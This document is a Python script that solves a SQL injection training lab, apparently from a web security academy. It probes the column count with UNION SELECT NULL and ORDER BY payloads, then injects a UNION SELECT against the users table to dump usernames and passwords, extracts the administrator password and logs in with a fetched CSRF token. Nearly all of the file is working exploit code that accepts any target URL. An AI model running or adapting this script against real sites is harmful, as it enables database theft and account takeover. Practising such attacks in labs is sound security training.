# SQL injection UNION attack, retrieving data from other tables

import sys
import requests
import urllib3
import urllib.parse
import re
import time
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(s, url):
	r = s.get(url, verify=False, proxies=proxies)
	time.sleep(1)
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def send_payload(url, payload):
	injection_uri = url + payload
	r = requests.get(injection_uri, verify=False, proxies=proxies)
	time.sleep(1)
	print('[+] Using payload:\t%s' % injection_uri)
	return r

def get_password(url):
	filter_path = url + '/filter?category='
	data_payload = "' UNION SELECT username, password FROM users--"
	print('[+] Retrieving usernames and passwords...\n')

	r = requests.get(filter_path + data_payload, verify=False, proxies=proxies)
	time.sleep(1)
	res = r.text
	password = re.search("""<th>administrator</th>
                            <td>(.*)</td>""", res).group(1)
	passes = re.findall("""<th>(.*)</th>
                            <td>(.*)</td>""", res)
	for p in passes:
		if len(p[0]) < 8:
			print('[+] %s:\t\t%s' % (p[0], p[1]))
		else:
			print('[+] %s:\t%s' % (p[0], p[1]))
	# print(passes)

	print('\n[+] Found Administrator password:    \t%s' % password)
	return password

def get_columns_number(url, payload):
	filter_path = url + '/filter?category='
	if payload == "SOLUTION1":
		print('[+] Using the UNION SELECT method to retrieve the number of columns...')
		payload = "' UNION SELECT NULL--"
		for i in range(1, 8):
			if send_payload(filter_path, payload).status_code == 200:
				print('\n[+] Number of Columns returned:\t%s' % i)
				return i
			else:
				payload = payload[:-2]
				payload += ", NULL--"
	elif payload == "SOLUTION2":
		print('[+] Using the ORDER BY method to retrieve the number of columns...')
		for i in range(1, 8):
			payload = "' ORDER BY %s--" % i
			if send_payload(filter_path, payload).status_code == 500:
				print('\n[+] Number of Columns returned:\t%s' % (i - 1))
				return i - 1

	else:
		return send_payload(filter_path, payload)


def main():
	print('[+] Lab: SQL injection UNION attack, retrieving data from other tables')
	try:
		url = sys.argv[1].strip()
		payload = sys.argv[2].strip()
	except IndexError:
		print('[+] Usage: %s <URL> <PAYLOAD>' % sys.argv[0])
		print('[+] Example: %s https://www.target.com "\' UNION SELECT NULL, NULL"' % sys.argv[0])
		print('[+] Example: %s https://www.target.com SOLUTION1\t\t(UNION)' % sys.argv[0])
		print('[+] Example: %s https://www.target.com SOLUTION2\t\t(solve the lab)' % sys.argv[0])
		sys.exit(-1)
	r = requests.get(url, verify=False, proxies=proxies, allow_redirects=False)
	time.sleep(1)
	if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
		print('\n[-] HOST seems to be down <!>')
		sys.exit(-1)

	time.sleep(1)
	if not "SOLUTION" in payload:
		r = send_payload(url + '/filter?category=', payload)
		time.sleep(1)
		res = r.text
		print(res)
	else:
		print('[+] Determining the number of columns returned by the query...')
		columns_count = get_columns_number(url, payload) 
		if columns_count:
			password = get_password(url)
			if password:
				s = requests.Session()
				print('\n[+] Trying to log in as administrator user...')
				login_path = url + "/login"
				csrf_token = get_csrf_token(s, login_path)
				login_data = {"csrf": csrf_token, "password": password, "username": "administrator"}
				r = s.post(login_path, data=login_data, verify=False, proxies=proxies)
				time.sleep(1)
				res = r.text
				if 'Your username is: administrator' in res:
					print('\n[+] Successfully logged in as Administrator !')
				else:
					print('\n[-] Exploit Failed to log in as Administrator <!>')
			else:
				print('\n[-] Exploit Failed to find the password <!>')

		else:
			print('\n[-] SQL Injection Failed <!>')




if __name__ == "__main__":
	main()
